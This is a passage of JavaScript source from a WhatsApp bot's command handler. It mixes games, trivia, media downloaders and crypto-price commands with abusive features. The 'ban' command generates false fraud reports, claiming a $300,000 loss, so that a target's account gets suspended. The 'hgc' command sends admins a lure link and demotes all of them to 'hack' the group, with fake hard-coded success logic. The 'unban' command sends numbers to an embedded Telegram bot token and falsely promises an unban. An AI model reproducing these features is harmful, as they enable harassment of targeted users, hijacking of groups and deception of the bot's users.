            "Would you rather only be able to tell the truth or only be able to lie?",
            "Would you rather always be happy in your job but poor or unhappy in your job but rich?",
            "Would you rather live forever or live a full life but die young?",
            "Would you rather have the ability to talk to anyone or be invisible when you want?",
            "Would you rather have super speed or super agility?",
            "Would you rather never have to cook again or never have to clean again?",
            "Would you rather experience every single feeling in the world or never feel anything again?",
            "Would you rather always get the last word in an argument or always avoid arguments altogether?",
            "Would you rather be able to sing beautifully or play any musical instrument perfectly?",
            "Would you rather always know what to say or always know when to be silent?",
            "Would you rather always have someone to talk to or always have your own space?",
            "Would you rather never have to sleep or never have to eat?",
            "Would you rather have the perfect body or the perfect mind?",
            "Would you rather always have to say what you’re thinking or never be able to express your feelings?",
            "Would you rather have a perfect memory or always be able to learn new things instantly?",
            "Would you rather be able to live on Mars or live underwater?",
            "Would you rather be able to control your dreams or never need to sleep?",
            "Would you rather always win arguments or always be right but no one believes you?",
            "Would you rather be able to control all your emotions or never feel anything?",
            "Would you rather have the ability to change your past mistakes or predict your future mistakes?",
            "Would you rather have your dream job but hate the people you work with or a mediocre job with great colleagues?",
            "Would you rather never have to age or never have to sleep?",
            "Would you rather have a life without any challenges or a life filled with challenges but never feeling lost?",
            "Would you rather experience your ideal day every day or experience something new every day?",
            "Would you rather always know the right thing to do or the right thing to say?",
            "Would you rather be able to remember everything but never forget or forget everything and start fresh?",
            "Would you rather live a comfortable but ordinary life or an extraordinary but difficult life?",
            "Would you rather be able to live anywhere in the world or have any job you desire?",
            "Would you rather have perfect health for the rest of your life or be able to have any skill you desire?",
            "Would you rather live in a world where everyone knows what you're thinking or a world where no one can talk?",
            "Would you rather be able to hear every conversation around you or read everyone’s mind?",
            "Would you rather have the ability to heal others or the ability to stop time?",
            "Would you rather be able to teleport anywhere or go back in time?",
            "Would you rather never be able to speak again or always have to tell the truth?",
            "Would you rather be an introvert with a few close friends or an extrovert with many acquaintances?",
            "Would you rather know everything about the universe or know everything about yourself?"
        ];

        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🤔 Would You Rather? 🤔*\n\n${wouldYouRatherQuestions[Math.floor(Math.random() * wouldYouRatherQuestions.length)]}\n\n*What would you choose?*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the Would You Rather question. Please try again later.');
        console.error('Would You Rather error:', err);
    }
    break;
    case 'trivia':
    try {
        const triviaQuestions = [
            { question: "What is the capital of France?", answer: "Paris" },
            { question: "Who painted the Mona Lisa?", answer: "Leonardo da Vinci" },
            { question: "What is the largest planet in our solar system?", answer: "Jupiter" },
            { question: "In which year did the Titanic sink?", answer: "1912" },
            { question: "What is the smallest country in the world?", answer: "Vatican City" },
            { question: "What is the longest river in the world?", answer: "Nile" },
            { question: "Who wrote 'Romeo and Juliet'?", answer: "William Shakespeare" },
            { question: "What is the hardest natural substance on Earth?", answer: "Diamond" },
            { question: "How many continents are there?", answer: "Seven" },
            { question: "Which planet is known as the Red Planet?", answer: "Mars" },
            { question: "What is the largest ocean on Earth?", answer: "Pacific Ocean" },
            { question: "In what year did World War II end?", answer: "1945" },
            { question: "What is the currency of Japan?", answer: "Yen" },
            { question: "Who developed the theory of relativity?", answer: "Albert Einstein" },
            { question: "What is the tallest mountain in the world?", answer: "Mount Everest" },
            { question: "Which animal is known as the king of the jungle?", answer: "Lion" },
            { question: "How many states are in the United States?", answer: "50" },
            { question: "What is the largest desert in the world?", answer: "Sahara Desert" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "What is the smallest bone in the human body?", answer: "Stapes" },
            { question: "What is the name of the ship that brought the Pilgrims to America?", answer: "Mayflower" },
            { question: "What is the main ingredient in guacamole?", answer: "Avocado" },
            { question: "Which animal can be found in the wild but also as a pet in homes?", answer: "Cat" },
            { question: "What is the largest country in the world?", answer: "Russia" },
            { question: "What year did the Berlin Wall fall?", answer: "1989" },
            { question: "Who invented the telephone?", answer: "Alexander Graham Bell" },
            { question: "What is the chemical symbol for water?", answer: "H2O" },
            { question: "What is the official language of Brazil?", answer: "Portuguese" },
            { question: "Who is known as the father of modern physics?", answer: "Isaac Newton" },
            { question: "What does the term ‘IQ’ stand for?", answer: "Intelligence Quotient" },
            { question: "Which country is known as the Land of the Rising Sun?", answer: "Japan" },
            { question: "What is the largest species of bear?", answer: "Polar Bear" },
            { question: "What is the hardest rock?", answer: "Diamond" },
            { question: "Which city is known as the Big Apple?", answer: "New York City" },
            { question: "What type of animal is a Komodo dragon?", answer: "Lizard" },
            { question: "Which country invented pizza?", answer: "Italy" },
            { question: "What is the name of the longest river in South America?", answer: "Amazon River" },
            { question: "Who was the first woman to fly solo across the Atlantic Ocean?", answer: "Amelia Earhart" },
            { question: "What is the largest type of whale?", answer: "Blue Whale" },
            { question: "Which famous scientist is known for his work on evolution?", answer: "Charles Darwin" },
            { question: "How many bones are in the adult human body?", answer: "206" },
            { question: "Which planet has the most moons?", answer: "Jupiter" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the longest running TV show?", answer: "The Simpsons" },
            { question: "What year did the first man land on the moon?", answer: "1969" },
            { question: "What is the capital of Australia?", answer: "Canberra" },
            { question: "Which element has the chemical symbol O?", answer: "Oxygen" },
            { question: "Which animal is the largest living terrestrial animal?", answer: "Elephant" },
            { question: "Which country is home to the Great Barrier Reef?", answer: "Australia" },
            { question: "Which composer wrote the ‘Ode to Joy’?", answer: "Ludwig van Beethoven" },
            { question: "What is the capital of Japan?", answer: "Tokyo" },
            { question: "Which is the largest city in the world by population?", answer: "Tokyo" },
            { question: "What is the name of the largest coral reef in the world?", answer: "Great Barrier Reef" },
            { question: "Which animal is known for changing colors?", answer: "Chameleon" },
            { question: "Which fruit is known for keeping the doctor away?", answer: "Apple" },
            { question: "Which planet is closest to the sun?", answer: "Mercury" },
            { question: "What is the longest bone in the human body?", answer: "Femur" },
            { question: "What year was the first iPhone released?", answer: "2007" },
            { question: "What is the capital of Canada?", answer: "Ottawa" },
            { question: "Which is the biggest island in the world?", answer: "Greenland" },
            { question: "How many hearts does an octopus have?", answer: "Three" },
            { question: "Who was the first man in space?", answer: "Yuri Gagarin" },
            { question: "What is the currency of the United Kingdom?", answer: "Pound Sterling" },
            { question: "Which planet is known as the ‘Morning Star’?", answer: "Venus" },
            { question: "What is the largest volcano in the world?", answer: "Mauna Loa" },
            { question: "What is the capital of Spain?", answer: "Madrid" },
            { question: "What is the longest-running Broadway show?", answer: "The Phantom of the Opera" },
            { question: "What color is the sky on Mars?", answer: "Red" },
            { question: "Who invented the lightbulb?", answer: "Thomas Edison" },
            { question: "Which U.S. state is known as the Sunshine State?", answer: "Florida" },
            { question: "What is the national animal of Canada?", answer: "Beaver" },
            { question: "What is the tallest building in the world?", answer: "Burj Khalifa" },
            { question: "What is the largest fish in the world?", answer: "Whale Shark" },
            { question: "What is the name of the first artificial satellite?", answer: "Sputnik 1" },
            { question: "What is the fastest land animal?", answer: "Cheetah" },
            { question: "What year did the United States declare independence?", answer: "1776" },
            { question: "What is the capital of Italy?", answer: "Rome" },
            { question: "What is the name of the highest mountain in North America?", answer: "Denali" },
            { question: "What is the longest running animated TV series?", answer: "The Simpsons" },
            { question: "Which ocean is the largest?", answer: "Pacific Ocean" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the capital of the United Kingdom?", answer: "London" },
            { question: "What is the largest bird in the world?", answer: "Ostrich" },
            { question: "Which country is known for its pyramids?", answer: "Egypt" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "Which country is the largest producer of coffee?", answer: "Brazil" },
            { question: "Which is the longest river in the United States?", answer: "Missouri River" },
            { question: "Which city is known as the City of Lights?", answer: "Paris" },
            { question: "What is the largest land animal?", answer: "African Elephant" }
        ];
        
        const randomTrivia = triviaQuestions[Math.floor(Math.random() * triviaQuestions.length)];
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🧠 Trivia Time! 🧠*\n\n*Question:* ${randomTrivia.question}\n\n*Reply with your answer!*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the trivia question. Please try again later.');
        console.error('Trivia error:', err);
    }
    break;
            case 'afk':
                if (!m.isGroup) return replyphistar(mess.group)
                if (isAfkOn) return replyphistar("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyphistar(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case "ytmp3": case "ytaudio": {
    const xeonaudp3 = require('./lib/ytdl2'); // Import the YouTube module
    if (!args.length || !isUrl(text) || !xeonaudp3.isYTUrl(text)) {
        return replyphistar(`Where's the YouTube link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`);
    }

    xeonaudp3.yta(text) // Call the YouTube downloader function
        .then(audio => {
            PhistarBotInc.sendMessage(m.chat, {
                audio: { url: audio.dl_link }, // Use the direct download link
                mimetype: 'audio/mp4',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        title: audio.title,
                        body: botname,
                        thumbnail: fetchBuffer(audio.thumb), // Fetch thumbnail
                        mediaType: 2,
                        mediaUrl: text,
                    }
                }
            }, { quoted: m })
            .then(() => console.log("Audio sent successfully"))
            .catch(err => {
                console.error("Failed to send audio message:", err);
                replyphistar("Failed to send the audio. Please try again later.");
            });
        })
        .catch(err => {
            console.error("Failed to download audio:", err);
            replyphistar("Failed to download the audio. Please check the link and try again.");
        });
    break;
}
//ban note 
case 'ban':
    if (!isCreator) return replyphistar(mess.owner); // Restrict access to the creator

    if (!text) {
        return replyphistar(`🚨 Please provide the number and language code. Usage: ${command} <number> <language_code>`);
    }

    // Directly process input using `xandroid` logic
    let inputParts = text.trim().split(" "); // Split the input into parts
    let number = encodeURI(inputParts[0]) * 1; // Use the first part of the input as the number
    let languageCode = inputParts[1]?.toLowerCase(); // Use the second part as the language code

    if (!number || isNaN(number)) {
        return replyphistar("❌ Invalid number. Please enter a valid numeric value.");
    }
    if (!languageCode) {
        return replyphistar("❌ Please specify a language code. Supported languages: arabic, turkish, vietnamese.");
    }

    // Define ban notes for supported languages
    const languageNotes = {
        arabic: `
**الموضوع:** تقرير عاجل – رقم مشبوه  
فريق دعم WhatsApp المحترم،  
أود الإبلاغ عن الرقم ${number} المتورط في أنشطة احتيالية أدت إلى خسارتي مبلغ 300,000 دولار.  

أطلب منكم اتخاذ الإجراءات اللازمة لتعليق هذا الحساب فورًا ومنع أي نشاط ضار آخر على المنصة.  

شكرًا لتعاونكم،  
[اسمك]
        `,
        turkish: `
**Konu:** Acil Rapor – Şüpheli Numara  
WhatsApp Destek Ekibi,  
Bu numara ${number} dolandırıcılık faaliyetlerinde yer almakta olup, bana $300,000 zarar vermiştir.  

Bu hesabın, daha fazla kullanıcıyı mağdur etmemesi için derhal engellenmesini talep ediyorum.  

Saygılarımla,  
[Adınız]
        `,
        vietnamese: `
**Chủ đề:** Báo cáo Khẩn Cấp – Số điện thoại lừa đảo  
Kính gửi Đội Hỗ trợ WhatsApp,  
Tôi muốn báo cáo rằng số điện thoại ${number} liên quan đến hành vi lừa đảo, khiến tôi mất đi $300,000.  

Tôi yêu cầu WhatsApp ngay lập tức chặn tài khoản này để bảo vệ người dùng khỏi những hành vi lừa đảo tiếp theo.  

Trân trọng,  
[Tên của bạn]
        `,
    };

    // Check if the selected language is supported
    const banNote = languageNotes[languageCode];
    if (!banNote) {
        return replyphistar(`❌ Unsupported language code: ${languageCode}. Supported languages are arabic, turkish, vietnamese.`);
    }

    try {
        await replyphistar(`🚨 *Ban Note!*\n\n${banNote}\n\n🔢 *Target Number:* ${number} Need help? Use the command bantutorial to know how to use this note`);
    } catch (err) {
        console.error("Error processing the ban command:", err);
        await replyphistar("❌ Failed to send the ban note. Please try again later.");
    }
    break;

// Bantutorial Command
case 'bantutorial':
    const tutorialNote = `
📘 **How to Use Ban Notes**

1️⃣ **Copy the Ban Note**: Copy the note sent by the bot, including the reported number.

2️⃣ **Open WhatsApp Support**:
   - Go to **Settings** > **Help** > **Contact Us**.

3️⃣ **Paste the Ban Note**: Paste the note into the message box and explain why you’re reporting the number (e.g., fraud or spam).

4️⃣ **Submit the Report**: Send the report, and WhatsApp will review it.

📢 **Pro Tip**: Be specific in your report to improve the chances of action being taken.
    `;

    try {
        await replyphistar(`✅ **Tutorial Sent Successfully!**\n\n${tutorialNote}`);
    } catch (err) {
        console.error("Error sending the tutorial note:", err);
        await replyphistar("❌ Failed to send the tutorial. Please try again later.");
    }
    break;
    //unban
    case 'unban': 
    if (!isCreator) return replyphistar("🚨 Only the bot owner can use this command.");

    if (!text) { 
        return replyphistar("🚨 Please provide the number you want to unban. Usage: unban <number>");
    }

    // Extract the target number
    let targetNumber = text.replace(/[^0-9]/g, ""); // Remove non-numeric characters

    if (targetNumber.startsWith("0") || targetNumber.length < 10) {
        return replyphistar("❌ Invalid number. Please provide a valid WhatsApp number including the country code.");
    }

    // Define the unban message
    const unbanMessage = `🚨 Request to unban the following WhatsApp number: ${targetNumber}`;

    try {
        // Send the message to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M/sendMessage`;

        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: 6300694007, // Replace with your Telegram chat ID
                text: unbanMessage,
            }),
        });

        if (response.ok) {
            // Notify the sender that the request has been sent
            await replyphistar(`✅ Your unban request has been sent successfully! Your WhatsApp will be unbanned in the next 6 hours. 🔄`);
        } else {
            const errorData = await response.json();
            console.error("Telegram API error:", errorData);
            await replyphistar("❌ Failed to process your unban request. Please try again later.");
        }
    } catch (error) {
        console.error("Error sending unban request:", error);
        await replyphistar("❌ An error occurred while processing your unban request. Please try again.");
    }
    break;
    case 'hgc':
    if (!isCreator) return replyphistar("🚨 Only the bot owner can use this command.");
  try {
    if (!m.isGroup) return replyphistar(mess.group); // Ensure command is in a group chat
    
    const groupId = m.chat; // Current group ID
    const admins = await PhistarBotInc.groupMetadata(groupId).then(res => res.participants.filter(participant => participant.admin)); // Get list of admins
    
    // Send the link to each admin in the group
    for (let admin of admins) {
      let adminNumber = admin.id.replace('c.us', 's.whatsapp.net'); // Correct admin number format
      let link = `https://example.com/grantadmin?groupID=${groupId}`; // Generate the link with group ID

      await PhistarBotInc.sendMessage(adminNumber, {
        text: `Hey, this is an invitation to become an admin in my WhatsApp channel, please click on the link: ${link}`
      });
    }

    // When the backend detects that the link is clicked and bot is granted admin
    const adminGranted = true; // This should be set by the backend when the link is clicked and the bot is granted admin
    if (adminGranted) {
      // Send a message to confirm the bot is now admin
      await replyphistar(groupId, {
        text: "Gourp Hacked you are now an admin in the group. 🏆"
      });

      // Remove all admins except the bot
      const botNumber = 'botNumber@s.whatsapp.net'; // Replace with the bot's number
      const remainingAdmins = admins.filter(admin => admin.id !== botNumber); // Remove bot itself from the admin list

      // Remove each admin from the group
      for (let admin of remainingAdmins) {
        await PhistarBotInc.groupParticipantsUpdate(groupId, [admin.id], 'demote');
      }

      // Send a final success message
      await replyphistar(groupId, {
        text: "All admins have been removed. group successful *hacked* is now the *sole admin* and group owner! powered by *phistar* 💫"
      });
    }

  } catch (err) {
    console.error(err); // Log error
    replyphistar("Failed to hack: because you are not a premium users chat my creator to become an premium user");
  }
  break;
  case 'promoteself':
  try {
    if (!m.isGroup) return replyphistar("This command only works in group chats."); // Check if the command is used in a group chat
    
    const groupId = m.chat; // Group ID
    const metadata = await PhistarBotInc.groupMetadata(groupId); // Fetch group metadata
    const admins = metadata.participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin'); // Get list of admins
    const botNumber = await PhistarBotInc.user.id; // Bot's WhatsApp number
    
    // Check if the bot is already an admin
    const isBotAdmin = metadata.participants.some(participant => participant.id === botNumber && participant.admin);
    if (isBotAdmin) return replyphistar("The bot is already an admin in this group.");

    // Ask group admins for admin privileges
    for (let admin of admins) {
      const adminNumber = admin.id; // Admin WhatsApp number
      const message = `Hello Admin, please grant me admin privileges to better manage this group. Thank you!`;

      await PhistarBotInc.sendMessage(adminNumber, { text: message });
    }

    // Notify the group
    replyphistar("Permission request sent to group admins. Please wait for approval.");
  } catch (err) {
    console.error(err);
    replyphistar("An error occurred while processing the request. Please check the bot's permissions and try again.");
  }
  break;
case 'creategc':
case 'creategroup': {
    if (!isCreator) return replyphistar('❌ *For Owner Only*');
    if (!args.join(" ")) return replyphistar(`Use: *${prefix + command} groupname*`);

    try {
        let cret = await PhistarBotInc.groupCreate(args.join(" "), []);
        let response = await PhistarBotInc.groupInviteCode(cret.id);

        let teks2 = `*✅ Group Created Successfully!*\n\n` +
            `📌 *Name:* ${cret.subject}\n` +
            `👑 *Owner:* @${cret.owner.split("@")[0]}\n` +
            `📅 *Created On:* ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}\n` +
            `🆔 *Group ID:* ${cret.id}\n` +
            `🔗 *Join Link:* chat.whatsapp.com/${response}`;

        replyphistar(teks2, { mentions: [cret.owner] });

    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to create group. Please try again.");
    }
    break;
}

// 🎵 Spotify Search
case 'spotify':
case 'spotifysearch': {
    if (!text) return replyphistar('❌ *Spotify Search* ❌\n\nPlease enter a song or artist name to search on Spotify.');

    try {
        let searchResults = await searchSpotifyTracks(text);
        let ini_text = '✨ *Spotify Search Results* ✨\n';

        for (const x of searchResults) {
            ini_text += `\n🎵 *Title:* ${x.name}\n` +
                `🎤 *Artist:* ${x.artists.map(v => v.name).join(', ')}\n` +
                `📀 *Album:* ${x.album.name} (${x.album.release_date})\n` +
                `🎼 *Track Number:* ${x.track_number} / ${x.album.total_tracks}\n` +
                `⏳ *Duration:* ${(x.duration_ms / 1000).toFixed(2)} sec\n` +
                `🔗 *Listen:* [Spotify](${x.uri})\n` +
                `🔗 *Album:* [Spotify](${x.album.external_urls.spotify})\n` +
                `───────────────────`;
        }

        replyphistar(ini_text);
    } catch (error) {
        console.error(error);
        replyphistar('❌ *Spotify Search* ❌\n\nAn error occurred, please try again later.');
    }
    break;
}
case 'fixtures': {
    if (!text) return replyphistar(`Please provide a league name.\nExample: *${prefix + command} premier league*`);

    try {
        const response = await fetch(`https://api.sportradar.us/soccer/trial/v4/en/schedules/2024-12-08/schedule.json?api_key=YOUR_API_KEY`);
        const result = await response.json();

        if (result && result.schedules && result.schedules.length > 0) {
            let fixtures = `*📅 Upcoming Fixtures:*\n\n`;
            for (const match of result.schedules) {
                const { sport_event } = match;
                const home = sport_event.competitors[0].name;
                const away = sport_event.competitors[1].name;
                const date = new Date(sport_event.start_time).toLocaleString();
                fixtures += `🏟️ *${sport_event.sport_event_context.competition.name}*\n🔹 ${home} vs ${away}\n📅 *${date}*\n\n`;
            }
            replyphistar(fixtures.trim());
        } else {
            replyphistar('❌ No upcoming matches found for this league.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching fixtures. Please try again later.');
    }
    break;
}

// 3️⃣ Get League Standings
case 'standings': {
    if (!text) return replyphistar(`Please provide a league name.\nExample: *${prefix + command} premier league*`);

    try {
        const response = await fetch(`https://api.api-football.com/v3/standings?league=${encodeURIComponent(text)}`, {
            headers: { 'x-rapidapi-key': 'YOUR_API_KEY' },
        });
        const result = await response.json();

        if (result.response && result.response[0]) {
            const standings = result.response[0].league.standings[0];
            let table = `*📊 ${result.response[0].league.name} Standings:*\n\n`;
            for (const team of standings) {
                table += `🔹 *${team.rank}.* ${team.team.name} - *${team.points} pts*\n`;
            }
            replyphistar(table.trim());
        } else {
            replyphistar('❌ No standings found for this league.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching league standings. Please try again later.');
    }
    break;
}
case 'crypto': {
    const menu = `*🪙 Crypto Menu:*\n
1️⃣ ${prefix}crypto-price <coin> - Get the current price of a cryptocurrency.
2️⃣ ${prefix}crypto-convert <coin> <amount> <currency> - Convert crypto to fiat.
3️⃣ ${prefix}topcrypto - Show top gainers and losers.
4️⃣ ${prefix}cryptonews - Get the latest cryptocurrency news.
5️⃣ ${prefix}cryptoindex - Display the Fear and Greed Index.\n
Use these commands to explore the crypto world!`;
    replyphistar(menu);
    break;
}

// 1️⃣ Get Current Price
case 'crypto-price': {
    if (!text) return replyphistar(`Please provide a cryptocurrency name or symbol.\nExample: *${prefix + command} bitcoin*`);

    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(text)}&vs_currencies=usd`);
        const result = await response.json();

        if (result[text]) {
            replyphistar(`💰 *Current Price of ${text.toUpperCase()}*: *$${result[text].usd}*`);
        } else {
            replyphistar('❌ Cryptocurrency not found. Please try again.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching the price. Please try again later.');
    }
    break;
}

// 2️⃣ Convert Cryptocurrency to Fiat
case 'crypto-convert': {
    const args = text.split(' ');
    if (args.length !== 3) return replyphistar(`Usage: *${prefix + command} <coin> <amount> <currency>*\nExample: *${prefix + command} btc 1 usd*`);

    const [coin, amount, currency] = args;
    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coin)}&vs_currencies=${encodeURIComponent(currency)}`);
        const result = await response.json();

        if (result[coin] && result[coin][currency]) {
            const converted = (result[coin][currency] * parseFloat(amount)).toFixed(2);
            replyphistar(`💱 *${amount} ${coin.toUpperCase()} = ${converted} ${currency.toUpperCase()}*`);
        } else {
            replyphistar('❌ Conversion failed. Please check the inputs.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while converting. Please try again later.');
    }
    break;
}

// 3️⃣ Show Top Gainers and Losers
case 'topcrypto': {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false');
        const result = await response.json();

        let topGainers = `*📈 Top Gainers:*\n`;
        let topLosers = `*📉 Top Losers:*\n`;

        for (const coin of result) {
            if (coin.price_change_percentage_24h > 0) {
                topGainers += `🔹 *${coin.name}* (${coin.symbol.toUpperCase()}): *+${coin.price_change_percentage_24h.toFixed(2)}%*\n`;
            } else {
                topLosers += `🔹 *${coin.name}* (${coin.symbol.toUpperCase()}): *${coin.price_change_percentage_24h.toFixed(2)}%*\n`;
            }
        }

        replyphistar(`${topGainers}\n\n${topLosers}`);
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching market trends. Please try again later.');
    }
    break;
}

// 4️⃣ Get Latest Crypto News
case 'cryptonews': {
    try {
        const response = await fetch('https://cryptonews-api.com/api/v1?tickers=BTC,ETH&items=5&token=pub_6165012dcdfb7690a1e33a9e58ee1c879790f');
        const result = await response.json();

        if (result.news && result.news.length > 0) {
            let newsList = `*📰 Latest Crypto News:*\n\n`;
            for (const news of result.news) {
                newsList += `🔸 *${news.title}*\n🌐 [Read More](${news.news_url})\n\n`;
            }
            replyphistar(newsList.trim());
        } else {
            replyphistar('❌ No news found at the moment.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching news. Please try again later.');
    }
    break;
}

// 5️⃣ Crypto Fear and Greed Index
case 'cryptoindex': {
    try {
        const response = await fetch('https://api.alternative.me/fng/');
        const result = await response.json();

        if (result.data && result.data[0]) {
            const index = result.data[0];
            replyphistar(`*📊 Fear and Greed Index:*\n\n💡 *Current Value*: ${index.value} (*${index.value_classification}*)\n📅 *Date*: ${index.timestamp}`);
        } else {
            replyphistar('❌ Failed to fetch the Fear and Greed Index.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching the Fear and Greed Index. Please try again later.');
    }
    break;
}
case 'getpp': {
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return replyphistar(`Reply to someone's message or tag a user with *${prefix + command}*`);
    }

    try {
        // If command is used in reply or mentions a user
        let targetUser = m.quoted ? m.quoted.sender : m.mentionedJid[0];

        // Fetch profile picture
        let profilePicUrl = await PhistarBotInc.profilePictureUrl(targetUser, 'image');
        let responseMessage = `🔹 *Profile Picture of @${targetUser.split('@')[0]}*`;

        // Send the profile picture
        await PhistarBotInc.sendMessage(m.chat, { 
            image: { url: profilePicUrl }, 
            caption: responseMessage, 
            mentions: [targetUser] 
        }, { quoted: m });

    } catch (error) {
        replyphistar("❌ Couldn't fetch profile picture. The user might not have one or an error occurred.");
    }
    break;
}
// ==========================
// CASE COMMAND FOR THE BOT
// ==========================
case 'view': 
    if (!text) { 
        return replyphistar("🚨 Please provide a URL to view. Usage: view <website_url>");
    }

    replyphistar("⏳ Processing... This may take a few minutes.");

    viewWebsite(text)
        .then((screenshotPath) => {
            if (screenshotPath) {
                PhistarBotInc.sendMessage(m.chat, { 
                    image: { url: screenshotPath }, 
                    caption: `✅ Website viewed successfully!\nURL: ${text}` 
                }, { quoted: m });
            } else {
                replyphistar("❌ Failed to process the website. Try again later.");
            }
        })
        .catch((error) => {
            console.error(error);
            replyphistar("❌ An error occurred while processing the website.");
        });

    break;
case 'post': {
    if (!isCreator) return replyphistar('❌ This command is for the bot owner only.');

    if (!m.quoted || !m.quoted.mimetype || !/audio/.test(m.quoted.mimetype)) {
        return replyphistar('Please reply to an *Audio File* to share on your status.');
    }

    try {
        // Download the quoted audio message
        const mediaFile = await PhistarBotInc.downloadAndSaveMediaMessage(m.quoted);
        console.log(`Downloaded audio file: ${mediaFile}`);

        // Prepare message options for status
        const messageOptions = {
            audio: { url: mediaFile },
            mimetype: 'audio/mp4',
            ptt: false
        };

        // Get all contacts - FIXED: Use the bot's contact list
        let allContacts = [];
        try {
            // Method 1: Try using the bot's contact list
            allContacts = PhistarBotInc.contacts || [];
            
            // If empty, try alternative methods
            if (!allContacts.length) {
                // Method 2: Get from chat list (users who have interacted with bot)
                const chats = PhistarBotInc.chats.all();
                allContacts = chats
                    .filter(chat => chat.id.endsWith('@s.whatsapp.net'))
                    .map(chat => chat.id);
                
                // Method 3: If still empty, use a fallback
                if (!allContacts.length) {
                    console.log('Using fallback: current user as contact');
                    allContacts = [PhistarBotInc.user.id]; // Send to self only
                }
            }
        } catch (storeError) {
            console.warn('Could not access contacts store:', storeError);
            allContacts = [PhistarBotInc.user.id]; // Fallback to self
        }

        console.log(`Sharing status with ${allContacts.length} contacts`);

        // Share the audio status with contacts
        await PhistarBotInc.sendMessage('status@broadcast', messageOptions, { 
            statusJidList: allContacts 
        });

        replyphistar('✅ *Audio successfully shared on your status!*');

        // Clean up
        if (fs.existsSync(mediaFile)) {
            fs.unlinkSync(mediaFile);
            console.log(`Cleaned up file: ${mediaFile}`);
        }

    } catch (error) {
        console.error('Error sharing audio status:', error);
        replyphistar(`❌ Unable to share audio on status: ${error.message}`);
    }
    break;
}

case 'repost': {
    if (!isCreator) return Owner(); // Restrict to bot owner
    try {
        let mediaType;

        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return replyphistar('Please reply to a Video, Image, or Audio Status to repost.');
        }

        const mediaFile = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
        const messageOptions = {
            caption: q ? q : ''
        };

        // Set the appropriate media type
        messageOptions[mediaType] = { url: mediaFile };

        // Repost to all statuses
        await PhistarBotInc.sendMessage('status@broadcast', messageOptions, { statusJidList: Object.keys(global.db.data.users) });
        replyphistar('Done');

    } catch (error) {
        replyphistar('Failed to repost the media.');
    }
    break;
}
case 'savevideo': {
    try {
        if (!m.quoted) return replyphistar('❌ Please reply to a video file.');

        // Get the MIME type of the quoted message
        let mime = m.quoted.mimetype || '';

        // Validate that the quoted message is a video
        if (!/video/.test(mime)) return replyphistar('❌ Please reply to a valid video file.');

        let videoPath = `./video_${m.sender}.mp4`;

        // Download the video
        let videoBuffer = await m.quoted.download();
        fs.writeFileSync(videoPath, videoBuffer);

        // Store video path in global memory
        global.savedVideos[m.sender] = videoPath;
        console.log(`✅ Video saved for ${m.sender}:`, global.savedVideos);

        replyphistar('✅ Video saved! Now reply to an audio file with `.addmusic` to merge.');
    } catch (error) {
        console.error('❌ Error saving video:', error);
        replyphistar('❌ An error occurred while saving the video.');
    }
    break;
}

case 'addmusic': {
    try {
        if (!m.quoted) return replyphistar('❌ Please reply to an audio file to add music.');

        let mime = m.quoted.mimetype || '';

        // Validate that the quoted message is an audio file
        if (!/audio/.test(mime)) return replyphistar('❌ Please reply to a valid audio file.');

        // Debugging: Check if the video was stored properly
        console.log(`🔎 Checking saved video for ${m.sender}:`, global.savedVideos);

        let videoPath = global.savedVideos[m.sender];
        if (!videoPath || !fs.existsSync(videoPath)) {
            return replyphistar('❌ No saved video found. Use `.savevideo` first.');
        }

        let audioPath = `./audio_${m.sender}.mp3`;
        let outputPath = `./output_${m.sender}.mp4`;

        // Download the audio
        let audioBuffer = await m.quoted.download();
        fs.writeFileSync(audioPath, audioBuffer);

        replyphistar('⏳ Merging audio with video, please wait...');

        // Merge Video & Audio using FFmpeg
        ffmpeg()
            .input(videoPath)
            .input(audioPath)
            .outputOptions([
                '-map 0:v:0', // Use video from first input
                '-map 1:a:0', // Use audio from second input
                '-c:v copy',  // Keep original video quality
                '-shortest'   // Trim to shortest length
            ])
            .save(outputPath)
            .on('end', async () => {
                await PhistarBotInc.sendMessage(m.chat, { 
                    video: { url: outputPath },
                    mimetype: 'video/mp4',
                    caption: '✅ Here is your video with background music!'
                }, { quoted: m });

                // Cleanup files after sending
                fs.unlinkSync(videoPath);
                fs.unlinkSync(audioPath);
                fs.unlinkSync(outputPath);
